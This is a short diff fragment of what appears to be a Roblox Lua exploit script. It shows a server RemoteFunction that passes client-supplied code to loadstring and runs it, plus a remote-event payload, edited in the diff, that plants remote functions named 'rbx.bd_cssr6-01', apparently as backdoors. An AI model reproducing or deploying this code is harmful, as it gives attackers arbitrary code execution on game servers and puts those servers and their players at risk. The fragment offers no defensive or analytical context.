@@ -3107,8 +3107,8 @@ r.OnServerInvoke = function(_, code)
    return loadstring(code)()
 end]])
 fireRemoteEvent([[
-					for _, v in pairs(game:GetDescendants()) do 
-				       Instance.new("RemoteFunction", v).Name = "rbx.bd_cssr6-01"
+					for _ = 1, 20 do 
+				       Instance.new("RemoteFunction", game.LocalizationService).Name = "rbx.bd_cssr6-01"
 				    end
 ]])
 wait(0.4)
